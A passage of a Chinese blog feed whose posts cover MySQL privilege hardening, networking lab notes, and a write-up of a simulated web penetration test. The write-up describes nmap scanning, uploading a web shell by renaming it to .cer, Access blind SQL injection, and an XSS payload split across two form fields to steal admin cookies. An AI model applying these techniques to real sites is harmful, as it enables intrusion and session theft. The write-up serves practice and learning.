    <content type="html"><![CDATA[<p>mysql中存在4个控制权限的表，分别为<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USER表</span><br><span class="line">2. mysql.DB表</span><br><span class="line">3. mysql.TABLES_PRIV表</span><br><span class="line">4. mysql.COLUMNS_PRIV表</span><br></pre></td></tr></table></figure><p>要注意的是，Mysql中有一个数据库”<code>information_schema</code>“，似乎里面保存的也是一些权限信息，但是要明白的是，这个数据库”<code>information_schema</code>“是为系统管理员提供元数据的一个简便方式，它实际上是一个视图，可以理解为对Mysql中的一个信息的封装，对于Mysql主程序来说，身份认证和授权的信息的来源只有一个，就是”<code>mysql</code>“。</p><p>在我们进行数据库连接、登录的时候，mysql权限表的验证过程为：</p><ol><li>先从user表中的:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p><ol start="2"><li>通过身份认证后，进行权限分配，按照下面的顺序进行验证。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将<code>不再</code>检查<code>db，tables_priv,columns_priv</code><br>如果全局权限表<code>user</code>对应的权限为<code>N</code>，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限<br>如果db中为N，则检查<code>tables_priv</code>中此数据库对应的具体表，取得表中的权限Y，以此类推。逐级下降</p><p>用自己的话讲就是因为查找他们权限是否配置好根据情况查看<code>mysql</code>这个数据库中的<code>user，db，tables_priv，columns_pri</code>，一旦在某个级别设置好了权限就不需要网下一级去看他是否存在权限了，因为下面一级的表都不会显示，这是为了防止数据库数据冗余。就是例如你设置的是所有数据库及表的权限的话，到时候就直接<code>select * from user;</code>就可以查看对应的程序啦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>对于Mysql中的账户权限相关的安全配置，总结如下：</p><ol><li>针对每个网站建立一个单独的账户</li><li>为每个网站单独建立一个专属数据库(虽然DEDE、DZ普通采用表前缀的方法来实现”一库多站”，但好的做法还是”一库一站”)</li><li>按照<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>的顺序进行细粒度的权限控制</li><li>为每个用户单独配置一个专属数据库，保证当前用户的所有操作只能发生在它自己的数据库中，防止SQL注入发生后，黑客通过注入点访问到系统表</li></ol><p>账户权限安全配置需要的常用命令<br>1)新建一个用户并给予相应数据库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on 数据库名字.表名 to user@localhost identified by 'passwd';    //如果是*号就是代表全部*.*代表所有数据库下的全部表名</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* <span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)显示授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //这句话只显示当前登录用户的权限</span><br></pre></td></tr></table></figure><p>4) 移除授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) 删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) 给用户改名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) 给用户改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql中存在4个控制权限的表，分别为
    
    </summary>
    
      <category term="Mysql安全配置" scheme="0verwatch.top/categories/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Mysql安全配置" scheme="0verwatch.top/tags/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>记录一次模拟渗透</title>
    <link href="0verwatch.top/2018/07/25/pentest-1/"/>
    <id>0verwatch.top/2018/07/25/pentest-1/</id>
    <published>2018-07-25T13:51:46.000Z</published>
    <updated>2018-07-25T13:55:55.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天还模拟了一次真实的挖洞过程，今天这网站一共有三个漏洞（都是要经过提醒才能弄出来），因为是搭的环境，简单记录一下思路，顺便当个回顾，源码啥的都没有了<a id="more"></a>，耍完就要求删掉了。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这台服务器有个前提就是跟我们一个网段的服务器，并且开了IIS服务，但是前提我们是不知道他的ip的，这个时候我们需要用一下nmap来扫一下同一网段下的ip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -PI -PT 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>记得当时出现了三个ip地址，再使用nmap去扫描各个ip的端口，命令是<code>namp 你锁定的ip地址</code></p><p>发现中间的第二个ip是有开IIS服务的，但是也开了其他端口的服务，这时候我们需要注意的是目标不要仅仅盯着IIS这个服务端口，我们也需要把其他不是常用端口都是尝试一遍，其中一些常见的端口要知道，常开的我们就可以选择性忽略，比如<code>3306可以远程连接数据库，3389远程连接，445端口永恒之蓝的端口</code>等等，遇到这些端口先记着，因为我们前提是不准使用msf打，毕竟我们练的是网站渗透的思路。所以还是回来网站的渗透思路上吧。</p><p>当时尝试到其中的<code>8888端口</code>的时候，就出现了一个网站，随便点两下，发现是一个asp的网站，这点很重要，不然到后期的时候上传木马的时候传了个php的小马就很搞笑了。</p><p>首先先扫描一波目录，这里我用的是一款很经典的扫描工具御剑，其实github上还有很多类似的扫描工具，就不多说了，扫到了一个类似源码的压缩包，这在正常情况下是很大的漏洞了，打开源码第一件事情先要去找配置文件，数据库配置文件之类的，由于这里用的是Access数据库，而<code>Access数据库</code>使用的是<code>文件存储</code>，在里面我们可以很轻易地找到后台登录管理员账号密码，只不过密码需要解密一下，此时也扫到了后台了登录页面，先登录一波，这时候我的思路先点一下查看一下是否有上传的地方，发现有图片上传的地方，因为源码已经得到了，我就去看源码关于上传这一部分的代码，这里面我审计出来可以用<code>cer</code>去改后缀名上传去执行，这里我们还需要注意下常见的除了<code>asp，aspx</code>可以执行以外，还有<code>cgi，cer</code>之类的后缀名可以尝试上传一下，最后上传之后就获得了网站的全权限了。</p><p>第二个漏洞是在某一个二级域名下存在的SQL注入漏洞，用的<code>and 1=1</code>还有<code>and1=2</code>测出来的，服务器返回了500作为盲注的回显点，参考了这篇文章:<code>https://blog.csdn.net/u011781521/article/details/53942183</code>, Access数据库的注入比较麻烦，我尝试出来是一个盲注，但是Access盲注在后期的表名全靠猜，字典里面没有就GG了。后面也是获得后台登录的密码。回到前面的步骤去getshell了。</p><p>第三个漏洞是一个XSS漏洞，这里也是别人提醒我才会用这种骚操作去得到管理员的cookie然后登陆后台，当时教我用xss平台去实现这一过程，在一个填写简历的的表单里面去实现，测试发现最大的两个文本框已经是编码实例化了，过滤了一大堆东西，就不可以利用了，问题是在上面填写学历还有姓名之类的地方存在xss，这里不得不赞一波这个xss平台，能将一大段js代码，变成一个短链接，缩小了代码量，别人就会更大的机会去点击，这里还学到的就是xss在点击查看源码的时候应该是要查看框架的源码，有时候可能直接右键看源码看到的是其他div的代码了，就看不清楚xss是否起了作用，而且这里的文本框限制了大小我们可以用Bp去实现发包实现，但是我查看源码发现缺了一段，原因就是Access里面限制了大小，那这个时候我们可以这样去绕过，注释符是一个好东西，分别在两个文本框里面填入<code>/*</code>和<code>*/</code>,就例如在姓名里面填入<code>&lt;script&gt;alert(1)/*</code>在学历的框里面填入<code>*/&lt;/script&gt;</code>这样测试就很OK，右键查看源码就可以发现在/**/里面就很多其他代码，但是就相当于注释掉了，刚好把两个框里面的代码拼在一起了，只是例举了一个反射型xss。这样就可以返回你的xss平台看你打的结果。然后就可以把cookie获得最好的方法就是直接在浏览器里面改变你需要的cookie，不然的话尝试一下用bp发包每一次都是需要改一次cookie的，因为页面的每一部分功能打开都是需要重新使用cookie，而本地保存的又不是你xss打回来的cookie，因此需要修改多次cookie，而最好的解决方法就是直接修改浏览器本地保存的cookie就好。登录后台又回到上传漏洞去了，233333。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>全文字，没有图片，终于把今天的思路回想了一遍。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天还模拟了一次真实的挖洞过程，今天这网站一共有三个漏洞（都是要经过提醒才能弄出来），因为是搭的环境，简单记录一下思路，顺便当个回顾，源码啥的都没有了
    
    </summary>
    
      <category term="网站渗透" scheme="0verwatch.top/categories/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网站渗透" scheme="0verwatch.top/tags/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>计网实验笔记(二)</title>
    <link href="0verwatch.top/2018/07/20/comp-net-2/"/>
    <id>0verwatch.top/2018/07/20/comp-net-2/</id>
    <published>2018-07-20T06:07:31.000Z</published>
    <updated>2018-07-20T06:15:24.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博客是接着上一篇的实验总结，这部分的实验是网络服务器配置设计，这部分感觉就有点水。<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><strong>实验内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1) 在PC机上下载安装IIS，学习IIS的组成和功能，以及IIS的使用方法。</span><br><span class="line">(2) 分别在本机进行WebServer、EmailServer、FTPServer的配置设计；</span><br><span class="line">(3) 通过另外一台接入互联网的PC机（或自己的手机）的通用客户程序（浏览器或DOS终端）访问自己设置的WebServer、EmailServer、FTPServer。</span><br></pre></td></tr></table></figure><h3 id="实验内容一"><a href="#实验内容一" class="headerlink" title="实验内容一"></a>实验内容一</h3><p>首先从控制面板里面找到程序然后去选择打开或关闭windows功能，选择Web管理工具还有万维网服务<br><img src="https://s1.ax1x.com/2018/07/20/P3oe8H.png" alt="P3oe8H.png"><br>然后回去控制面板里面选择管理工具，打开第一个IIS管理器<br><a href="https://imgchr.com/i/P3onxA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3onxA.md.png" alt="P3onxA.md.png"></a><br>点击左边的网站然后去新建一个网站，我的配置信息如下，IP地址为192.168.19.1，网站的源码目录在放在该电脑下的C盘目录下的www目录下，这里可以自己设置域名<br><img src="https://s1.ax1x.com/2018/07/20/P3oKKI.png" alt="P3oKKI.png"></p><p>点击新建立的网站还可以去设定默认的页面是什么<br><a href="https://imgchr.com/i/P3oMrt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oMrt.md.png" alt="P3oMrt.md.png"></a><br>在www目录下编写一个HTML页面，代码内容如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">        My frrst Page!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p1</span>&gt;</span>这是我第一个Web服务器<span class="tag">&lt;/<span class="name">p1</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在本机浏览器目录下输入对应的IP地址也就是刚刚设定IP，浏览器上有回显内容<br><img src="https://s1.ax1x.com/2018/07/20/P3oyiF.png" alt="P3oyiF.png"></p><h3 id="实验内容二"><a href="#实验内容二" class="headerlink" title="实验内容二"></a>实验内容二</h3><p><strong>WebServe的配置设计</strong><br>上网随便下载一个ASP源码，然后放在所设定的网页目录下，设置默认网站访问index.html,配置的相关信息，步骤跟上面配置IIS服务器差不多<br><img src="https://s1.ax1x.com/2018/07/20/P3o7Je.png" alt="P3o7Je.png"><br>本机访问219.219.68.183:8080,浏览器有回显<br><a href="https://imgchr.com/i/P3oHRH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oHRH.md.png" alt="P3oHRH.md.png"></a></p><p><strong>FTPServer的配置设计</strong><br>FTP服务的开启跟IIS的开启有点类似，从控制面板里面找到程序然后去选择打开或关闭windows功能，选择FTP服务器的选项<br><img src="https://s1.ax1x.com/2018/07/20/P3oXLt.png" alt="P3oXLt.png"></p><p>然后就开始配置FTP服务器，选中一个目录用来存放你提供访问以及下载的文件<br>电脑的C盘下设置C:\FTP，该目录下有很多子目录供访问，上传和下载。<br>然后在IIS管理器里面新建一个FTP站点，然后设置相关的信息<br><img src="https://s1.ax1x.com/2018/07/20/P3oveP.png" alt="P3oveP.png"><br><img src="https://s1.ax1x.com/2018/07/20/P3oxdf.png" alt="P3oxdf.png"></p><p>然后设置身份信息还有权限，设置匿名用户的话就允许其他人访问了，如果有特殊要求再设置其他用户类型，点击完成就可以开启该服务了<br><img src="https://s1.ax1x.com/2018/07/20/P3TFQs.png" alt="P3TFQs.png"></p><p>在本机浏览器上输入自己设定的ip,输入<code>ftp://219.219.61.183,</code>浏览器上显示目标文件夹内的所有文件，并支持下载，如图<br><a href="https://imgchr.com/i/P3Tkyn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Tkyn.md.png" alt="P3Tkyn.md.png"></a></p><p><strong>SMTP服务器的配置</strong><br>这里原本的配置原本是想直接在windows上面实现的，都是后来发现了一种更好的方可以用思科这款工具完成，其实上面的实验也可以直接模仿，网络拓扑图就是下面的结构，<br><a href="https://imgchr.com/i/P3TZwV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3TZwV.md.png" alt="P3TZwV.md.png"></a><br>但是就单单配置邮箱服务器的话，我就把拓扑图简化，形成下面的拓扑图，需要注意的是在没有DHCP服务器的的情况下，需要自己静态去配置IP地址，域名服务器保留<br><img src="https://s1.ax1x.com/2018/07/20/P3TeoT.png" alt="P3TeoT.png"></p><p>PC1还有PC2两台机子的IP设置如下，还有MAIL和DNS服务器的IP地址设置<br><img src="https://s1.ax1x.com/2018/07/20/P37Gcj.png" alt="P37Gcj.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37Jjs.png" alt="P37Jjs.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37tun.png" alt="P37tun.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37NBq.png" alt="P37NBq.png"><br>然后再配置DNS服务器里面的相关域名，其他无用的服务我们可以关掉<br><a href="https://imgchr.com/i/P37wNT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37wNT.md.png" alt="P37wNT.md.png"></a><br>然后配置邮箱服务器，注意这里要配置的两个用户名与密码跟后面PC1和PC2配置的要一致。我这里设置的是test1和test2<br><a href="https://imgchr.com/i/P37DCF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37DCF.md.png" alt="P37DCF.md.png"></a><br>然后在PC1和PC2里面配置相对应邮件信息，这时候上面配置的用户名就有用了<br><img src="https://s1.ax1x.com/2018/07/20/P37sgJ.png" alt="P37sgJ.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37yv9.png" alt="P37yv9.png"><br>点击PC1邮件功能里面的compose编辑发送邮件的信息，然后Send<br><a href="https://imgchr.com/i/P37cuR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37cuR.md.png" alt="P37cuR.md.png"></a></p><p>从receive里查看接受的信息，收到刚才发送的信息了<br><img src="https://s1.ax1x.com/2018/07/20/P37gD1.png" alt="P37gD1.png"><br>同理，PC2也能同样的接受发送信息</p><h3 id="实验内容三"><a href="#实验内容三" class="headerlink" title="实验内容三"></a>实验内容三</h3><p>手机访问Webserver，也就是219.219.68.183:8080,手机上回显网页信息，搭建成功<br><img src="https://s1.ax1x.com/2018/07/20/P372Hx.jpg" alt="P372Hx.jpg"></p><p>同样手机访问FTPserver，填写好信息,手机上回显网页信息，连接成功<br><a href="https://imgchr.com/i/P37WE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37WE6.md.png" alt="P37WE6.md.png"></a><br>对于邮箱服务器用PC1跟PC2互相发送邮件:<br><a href="https://imgchr.com/i/P375CD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P375CD.md.png" alt="P375CD.md.png"></a><br><a href="https://imgchr.com/i/P37I8e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37I8e.md.png" alt="P37I8e.md.png"></a><br>两台机子都能够互相接收邮件，成功验证</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>突然发现仿真软件真的是强大，本来还是想在win7的机子上直接模拟的邮箱服务器，发现死活都不行，没想到仿真软件还能这样玩，自己还是太菜，啥都不知道。。。。关于邮件，smtp协议只是一个发送的协议，接收邮件的时候用的可是pop以及imap协议，这还是要注意一下的，不过现在的发邮件都是被http封装的，也就是直接从web里面直接完成操作，即使改变了UA到服务器那一段，但是两个邮箱服务器之间传输的协议还是没有变的，依旧是smtp。。。</p><p>放暑假了啊！！！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇博客是接着上一篇的实验总结，这部分的实验是网络服务器配置设计，这部分感觉就有点水。&lt;br&gt;
    
    </summary>
    
      <category term="计算机网路" scheme="0verwatch.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
    
      <category term="计算机网路" scheme="0verwatch.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>计网实验笔记(一)</title>
    <link href="0verwatch.top/2018/07/20/comp-net-1/"/>
    <id>0verwatch.top/2018/07/20/comp-net-1/</id>
    <published>2018-07-20T06:05:22.000Z</published>
    <updated>2018-07-20T06:18:51.115Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这一篇是对协议报文的分析，这里面有对Wireshark的使用，只能说我对于Wireshark这款软件的使用还是渣。各种ip地址的过滤以及如何去利用Wireshark强大的搜索功能这里就不多说了。个人感觉最好的方法就是在CTF里面的流量分析题目里学，在CTF的流量分析题目里面你会经常触碰到那种要导出文件图片，导进秘钥解密https的各种类型题，感觉学的会更快。</p><p>不多说废话下面上课实验的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1） 运用抓包工具，分别获取不同互联网访问情形下的本机网卡数据包；过滤捕获和过滤显示不同条件的数据包。</span><br><span class="line">（2）分别对不同互联网访问情形下的数据包进行逐层分析，给出各层协议的主要参数及意义；要求分别获取WWW服务、Email服务、QQ通信和迅雷文件下载四种不同网络服务过程中的数据包。</span><br><span class="line">（3）运用抓包工具，连续获取面向连接的互联网访问情形下的本机网卡数据包；对连续获取的数据包找到执行面向连接过程的报文，给出实现面向连接过程（TCP三次握手）的详细分析。</span><br></pre></td></tr></table></figure></p><h3 id="实验内容第一点"><a href="#实验内容第一点" class="headerlink" title="实验内容第一点"></a>实验内容第一点</h3><p><strong>http协议</strong><br>关于这个协议，个人理解是万维网的服务协议，默认端口是80端口，运输层使用的是可靠的TCP，不过现在也有它的加密版本https，也就是在http的基础上增加了ssl去加密，默认端口是443，所以在我们需要解密含有https的报文的时候，想查看更多的信息，应该追踪http流而不应该追踪tcp，到运输层的时候已经加密了，看不出啥东西的，我记得DDCTF里面有一道流量分析的题目就是这样的，里面可以导出一个图片然后运用的是ocr把秘钥提取出来。确实有点烦，ocr这东西不准。对于Wireshark里面的分组，我们可以直接过滤http就可以获得啦，前提是记得访问http的页面，别访问https的页面，233333，不然你只能顾虑的是https了。</p><p><a href="https://imgchr.com/i/P3dftU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P3dftU.md.png" alt="P3dftU.md.png"></a></p><p><strong>UDP协议</strong><br>UDP协议是面向报文的一种协议，如果你观察他的封装，你会发现客户给他什么数据他就直接封装网下层IP层送去，不像TCP一样会有时候会对报文的进行分组处理，所以一般UDP都是不可靠，无连接的，除非上层的应用程序承担了检错的任务，所以UDP协议追求的是效率，一般都用在视频语音上了。我们在抓包的时候直接使用udp就可以过滤网络中的udp用户数据报文了。</p><p><a href="https://imgchr.com/i/P30lMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30lMd.md.png" alt="P30lMd.md.png"></a></p><p><strong>TCP协议</strong><br>TCP协议是是一种面向字节流，可靠，面向连接的协议，他对于用户传送的报文可以进行分组形成报文段，其中协议中如何保证传输的正确性，如何进行拥塞控制，如何进行连接的建立以及释放都是重点，为了复习，还是回顾一下吧，其中保证传输的正确性窗口(窗口的概念就不多讲了)的作用至关重要，其中最为重要的是其中的ARQ协议(自动重传协议)，对于拥塞控制，最重要的还是那四个算法，慢开始，拥塞避免，快重传，快恢复，关键点就在拥塞窗口值以及门限值的变化并且在不同情况下使用的算法也不一样，慢开始是使用在一开始的时候以及发现超时的时候使用的，而快重传，快恢复是在在超时计数器结束前连续收到三个响应报文使用的。在过滤的时候我们只需要用tcp命令就可把TCP报文给滤出来了。</p><p><a href="https://imgchr.com/i/P30YIf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30YIf.md.png" alt="P30YIf.md.png"></a></p><p><strong>ICMP协议</strong><br>ICMP协议是一种用于报告错误信息的协议，位于IP层，我们平常使用的ping，tracert命令都是属于这一协议里面的，这两个命令都十分常用，ping用于及钠盐网络是否连通，而是用tracert命令我们可以探测出网络拓扑结构，所以要抓到icmp的报文，只需要ping一下然后在Wireshark里面用icmp这一个命令过滤出来即可。<br><a href="https://imgchr.com/i/P32ksU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P32ksU.md.png" alt="P32ksU.md.png"></a></p><h3 id="实验内容第二点"><a href="#实验内容第二点" class="headerlink" title="实验内容第二点"></a>实验内容第二点</h3><p>先把各部分的包的先过滤出来</p><p><strong>WWW服务数据包:</strong><br><a href="https://imgchr.com/i/P3RwN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RwN9.md.png" alt="P3RwN9.md.png"></a><br><strong>Email服务数据包:</strong><br><a href="https://imgchr.com/i/P3Rlhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Rlhn.md.png" alt="P3Rlhn.md.png"></a><br><strong>QQ通信数据包:</strong><br><a href="https://imgchr.com/i/P3R0hR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3R0hR.md.png" alt="P3R0hR.md.png"></a></p><p><strong>迅雷文件下载服务数据包:</strong><br><a href="https://imgchr.com/i/P3RqHg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RqHg.md.png" alt="P3RqHg.md.png"></a></p><p>不同互联网访问情形下的数据包进行逐层分析，先Packet Details Pane(封包详细信息)有大致理解, 显示封包中的字段，各行信息说明如下：</p><ol><li>Frame:  物理层的数据帧概况(这是最底层的，一般以比特流传送，看不懂)</li><li>Ethernet II:  数据链路层以太网帧头部信息，</li><li>Internet Protocol Version 4:  互联网层IP包头部信息</li><li>Transmission Control Protocol:  传输层T的数据段头部信</li><li>Hypertext Transfer Protocol:  应用层的信息</li></ol><p><strong>UDP数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3W85d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3W85d.md.png" alt="P3W85d.md.png"></a><br>这个数据包的详细信息里面包含了物理层(Frame那一行)，数据链路层(Ethernet那一行)，网路层(Internet Protocol那一行)，传输层(User Datagram Protocol那一行)还有应用层数据，层次结构十分明显。<br>从UDP的报文格式可以得到UDP的首部信息，源端口为4026，目的端口为8000，UDP长度为55，检验和为0x4362<br><a href="https://imgchr.com/i/P3hE11" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hE11.md.png" alt="P3hE11.md.png"></a><br>再看IP层的内容<br><a href="https://imgchr.com/i/P3hZX6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hZX6.md.png" alt="P3hZX6.md.png"></a><br>可以清楚分析出他的首部信息，首部长为20字节，还有标识位5428，3位没有设置的标志位以及总长度偏移量，TTL为64，协议字段17，代表了上层使用UDP，下面就是源IP为192.168.1.101，目的IP为140.207.62.105<br>再往下分析就是数据链路层了，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hmnK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hmnK.md.png" alt="P3hmnK.md.png"></a></p><p><strong>http数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3htnf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3htnf.md.png" alt="P3htnf.md.png"></a><br>对于http数据进行分析，发现还是离不开五层协议，物理层，数据链路层，网路层，传输层，还有应用层，层次结构十分明显，这一次应用层以http报文显示，里面传递的的东西很明确，通过GET方式访问网站资源，访问的主机名为pub.idqqimg.com,还有其他的一些浏览器相关的信息等等。<br><a href="https://imgchr.com/i/P3hwNQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hwNQ.md.png" alt="P3hwNQ.md.png"></a><br> 下面一层是TCP，可以看出TCP首部信息，我们也可以从另一个方面推出http协议使用的运输层协议是tcp，源端口为18122，目的端口为80，还有它的序号以及确认信号，还可以看到标志位Flags，窗口大小为32768，首部长度为20，检验和是0x0dfc,紧急指针Urgent pointer置0<br> <a href="https://imgchr.com/i/P3hD9s" 